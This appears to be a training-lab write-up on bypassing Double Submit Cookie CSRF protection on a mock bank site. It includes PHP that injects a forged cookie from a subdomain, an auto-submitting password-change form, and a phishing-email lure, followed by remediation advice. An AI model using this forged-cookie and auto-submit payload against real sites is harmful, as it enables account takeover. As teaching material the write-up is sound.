A CSRF token is a unique, unpredictable value associated with a user's session, ensuring each request comes from a legitimate source. One effective implementation is the **[Double Submit Cookies technique](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#alternative-using-a-double-submit-cookie-pattern)**, where a cookie value corresponds to a value in a hidden form field. When the server receives a request, it checks that the cookie value matches the form field value, providing an additional layer of verification.

**How it works**
- **Token Generation**: When a user logs in or initiates a session, the server generates a unique CSRF token. This token is sent to the user's browser both as a cookie (CSRF-Token cookie) and embedded in hidden form fields of web forms where actions are performed (like money transfers).
- **User Action**: Suppose the user wants to transfer money. They fill out the transfer form on the website, which includes the hidden CSRF token.
- **Form Submission**: Upon submitting the form, two versions of the CSRF token are sent to the server: one in the cookie and the other as part of the form data.
- **Server Validation**: The server then checks if the CSRF token in the cookie matches the one sent in the form data. If they match, the request is considered legitimate and processed; if not, the request is rejected.

## Possible Vulnerable Scenarios
Despite its effectiveness, it's crucial to acknowledge that hackers are persistent and have identified various methods to bypass Double Submit Cookies:

- **Session Cookie Hijacking (Man in the Middle Attack):** If the CSRF token is not appropriately isolated and safeguarded from the session, an attacker may also be able to access it by other means (such as malware, network spying, etc.).
- **Subverting the Same-Origin Policy (Attacker Controlled Subdomain)**: An attacker can set up a situation where the browser's same-origin policy is broken. Browser vulnerabilities or deceiving the user into sending a request through an attacker-controlled subdomain with permission to set cookies for its parent domain could be used.
- **Exploiting XSS Vulnerabilities**: An attacker may be able to obtain the CSRF token from the cookie or the page itself if the web application is susceptible to Cross-Site Scripting (XSS). By creating fraudulent requests with the double-submitted cookie CSRF token, the attacker can get around the defence once they have the CSRF token.
- **Predicting or Interfering with Token Generation**: An attacker may be able to guess or modify the CSRF token if the tokens are not generated securely and are predictable or if they can tamper with the token generation process.
- **Subdomain Cookie Injection**: Injecting cookies into a user's browser from a related subdomain is another potentially sophisticated technique that might be used. This could fool the server's CSRF protection system by appearing authentic to the main domain.

## Example
This technique will chain two vulnerable scenarios by reversing token generation and injecting a cookie through an attacker-controlled subdomain.

- The attacker has successfully transferred the amount from Josh's bank account but seems more greedy and wants to take complete control of the bank account.
- To exploit the account, the attacker must access the bank account. But how? This requires the password of the Josh account.
- Exploiting a vulnerability like CSRF requires a lot of code and functionality and understanding the website logic from the developer's point of view. The attacker logged into his bank account and noticed that the form for updating passwords is protected through a CSRF- token.

```html
<form method="post" action="">
        <label for="password">Password:</label>
        <input type="password" id="password" name="new_password" required>

        <label for="confirm_password">ConfirmPassword:</label>
        <input type="password" id="confirm_password" name="confirm_password" required>
		<input type="hidden" id="csrf_token" name="csrf_token" value="<?php echo $_COOKIE['csrf-token']; ?>">
        <button type="submit" name="password_submit" >Update Password</button>
    </form>submit">
</form> 
```

- But does that ultimately resolve the problem? An attacker can only bypass this security measure if he finds a way to reverse-engineer the token.
- He opens the Chrome built-in `Inspect element` console to verify the cookies created locally by the website.
	![](Pasted%20image%2020241225155415.png)
- The attackers identified two relevant cookies created in the browser: `csrf-token` and `PHPSESSID`. Typically, the PHPSESSID is randomly generated by the PHP engine itself, and it is not very easy to reverse it for session hijacking. Consequently, the attacker copied his token and noticed if he could reverse engineer it.
- He used [Cyber Chef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=UjBJNE1rMVpRa0ZPU3pVMk9UZ0s) to see if he could decode the string and, surprisingly, noticed that the CSRF token was a string he could decrypt.
	![](Pasted%20image%2020241225155515.png)
- He noticed that the string decoded from the token was his bank account number, meaning the web application developer needed to implement CSRF tokens better to avoid exploitation. We know that the attacker already has access to the subdomain of `mybank.thm` which can help him inject the cookie and has already reverse-engineered the cookie. Now, it's time to prepare a payload.

### **Preparing Payload**
- For the attack to work, the attacker would use the social engineering technique to make the victim click on a link.
- The attacker will prepare an enticing email to compel the user to change his password. He prepared an email citing a suspicious login attempt to Josh email and sent it to Josh.
	![](Pasted%20image%2020241225155710.png)
- The email contained a link to an **attacker-controlled domain** (`attacker.mybank.thm`) with a password update form similar to a bank one. The form also has a CSRF token already set as a hidden parameter.

```html
<form method="post" action="http://mybank.thm:8080//changepassword.php" id="autos">
        <label for="password">Password:</label>
        <input type="password" id="password" name="current_password" value="<?php echo "GB82MYBANK5697" ?>" required>

        <label for="confirm_password">ConfirmPassword:</label>
        <input type="password" id="confirm_password" name="confirm_password" value="Attacker Unique Password" required>
		<input type="hidden" id="csrf_token" name="csrf_token" value="Decrypted Token Value">
		

        <button type="submit" name="password_submit"  id="password_submit" >Update Password</button>
    </form>
	
	</div>
<script>
document.getElementById('password_submit').click(); 
</script>
```

- Navigate to Josh's mailbox at the `mailbox.thm:8081` to see the new mail with the crafted CSRF payload.
- Once you click the link, it will redirect you to the attacker-controlled subdomain page and auto-submit the form to change the password. The attacker contains a code similar to that of the change password page of `mybank.thm`; however, he is also setting a cookie with the following code so that it will be forwarded to the main domain `mybank.thm` while triggering a CSRF attack.

```php
<?php
...
setcookie(
    'csrf-token',               
    base64_encode("GB82MYBANK5699"),            
    [
        'expires' => time() + (365 * 24 * 60 * 60), 
        'path' => '/',                         
        'domain' => 'mybank.thm',                          
        'secure' => false,                      
        'httponly' => false,                 
        'samesite' => 'Lax' 
    ]
);
?>
```

- The attacker knows the hidden form parameter, and the form will submit all the data, including the hidden fields, to the original change password page of `mybank.thm:8080`. Following is the server-side code, let's see what is happening on the server:

```php
<?php
if (base64_decode($_POST["csrf_token"]) == base64_decode($_COOKIE['csrf-token'])) { 
// Retrieve form data
$currentPassword = $_POST["current_password"];
$newPassword = $_POST["confirm_password"];
// Update Password
...;
```

- As we see in the above code, the server will decode the CSRF token and compare it with the cookie value. The server hosting `mybank.thm:8080` will consider the request legitimate as it comes from a logged-in user, and the CSRF token is also valid and will update the password.
	![](Pasted%20image%2020241225160440.png)
**Note**: 
	For ease, the server request headers are displayed on the webpage to understand received cookies and form data.

**What was the missing link?**
The server-side script correctly validated the user; however, the CSRF token was easy to predict, and therefore, the attacker could launch a crafted CSRF attack.


### Securing the Breach
- From a **pentester/red teamer perspective**, it is essential to validate the complete flow of HTTP request/response, double check the request parameters for any possible vulnerability like easy-to-guess tokens and invalid input, and scrutinise the client-side JavaScript code for potential issues.
- From a **secure coder perspective**, ensuring that the token generation methods generate extremely unique and hard-to-guess tokens is essential.
- The bank IT team quickly identified the issue and updated the token generation algorithm to remain unique and hard to predict.
- Open Josh's mailbox and navigate to the attacker's email with a green badge titled Urgent: Action Required - Suspicious Login Attempt Detected:
	![](Pasted%20image%2020241225160731.png)
- Using the same payload will not work because the server has correctly implemented a secure and unpredictable CSRF token that won't allow requests from an unknown source.
	![](Pasted%20image%2020241225160747.png)
